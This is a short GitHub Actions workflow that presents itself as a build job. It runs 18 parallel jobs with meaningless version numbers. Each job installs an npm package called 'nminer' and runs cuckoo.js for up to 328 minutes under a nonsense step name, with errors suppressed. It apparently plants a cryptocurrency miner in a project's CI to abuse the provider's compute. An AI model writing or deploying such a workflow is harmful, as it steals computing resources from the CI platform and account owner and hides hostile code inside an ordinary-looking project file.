name: cuckoo
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 479 }
          - { version: 2182 }
          - { version: 2766 }
          - { version: 1092 }
          - { version: 7368 }
          - { version: 559 }
          - { version: 4952 }
          - { version: 3146 }
          - { version: 1358 }
          - { version: 3227 }
          - { version: 8263 }
          - { version: 1915 }
          - { version: 3668 }
          - { version: 5025 }
          - { version: 8108 }
          - { version: 3876 }
          - { version: 2120 }
          - { version: 5380 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: ouch mortar yippee
        run: |
          npm install nminer@latest
          timeout 328m node cuckoo.js || echo "cuckoo executed"